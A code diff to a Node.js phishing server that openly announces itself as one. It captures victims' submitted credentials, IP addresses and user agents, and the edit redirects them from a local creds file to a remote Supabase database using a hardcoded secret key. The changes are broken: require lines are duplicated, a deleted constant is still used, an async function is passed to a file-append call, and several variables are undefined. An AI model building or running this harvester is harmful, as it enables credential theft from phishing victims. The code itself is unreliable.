@@ -1,10 +1,17 @@
 const http = require('http');
 const fs = require('fs');
+const http = require('http');
+const fs = require('fs');
 const path = require('path');
+const { createClient } = require('@supabase/supabase-js');
+
+// Supabase connection
+const supabase = createClient(
+  "https://ivjkhypkokeyezrrcnip.supabase.co",
+  "sb_secret_XPeo9Cvwi4HaNlAjSbEBLQ_--9C-bdd"
+);
 
 const PORT = 80;
-const LOG_DIR = './logs';
-const CREDS_FILE = './creds.txt';
 
 // Ensure directories exist
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
@@ -14,8 +21,24 @@ function logData(data) {
     const timestamp = new Date().toISOString();
     const logLine = `[${timestamp}] ${JSON.stringify(data)}\n`;
     
-    // Append to creds file
-    fs.appendFileSync(CREDS_FILE, logLine);
+    // Append to form_data
+    fs.appendFileSync(async function saveToDatabase() {
+  const { data, error } = await supabase
+    .from("form_data")
+    .insert([
+      {
+        name: formName,
+        email: formEmail,
+        message: formMessage
+      }
+    ]);
+
+  if (error) {
+    console.log(error);
+  } else {
+    console.log("Saved to Supabase");
+  }
+    });
     
     // Also write individual log file per session
     const email = data.email || 'unknown';
@@ -47,9 +70,25 @@ const server = http.createServer((req, res) => {
                 
                 // Log IP and extra info
                 const metaLine = `[${new Date().toISOString()}] IP: ${req.socket.remoteAddress} | UA: ${data.userAgent || 'N/A'}\n`;
-                fs.appendFileSync(CREDS_FILE, metaLine);
+                fs.appendFileSync(async function saveToDatabase() {
+  const { data, error } = await supabase
+    .from("form_data")
+    .insert([
+      {
+        name: formName,
+        email: formEmail,
+        message: formMessage
+      }
+    ]);
+
+  if (error) {
+    console.log(error);
+  } else {
+    console.log("Saved to Supabase");
+  }
+});
                 
-                res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ status: 'ok' }));
             } catch (e) {
                 res.writeHead(400);
@@ -85,6 +124,6 @@ const server = http.createServer((req, res) => {
 
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`[+] Phishing server running on http://0.0.0.0:${PORT}`);
-    console.log(`[+] Credentials will be saved to ${CREDS_FILE}`);
+    console.log(`[+] Credentials will be saved to ${(form_data)}`);
     console.log(`[+] Individual logs in ${LOG_DIR}/`);
 });
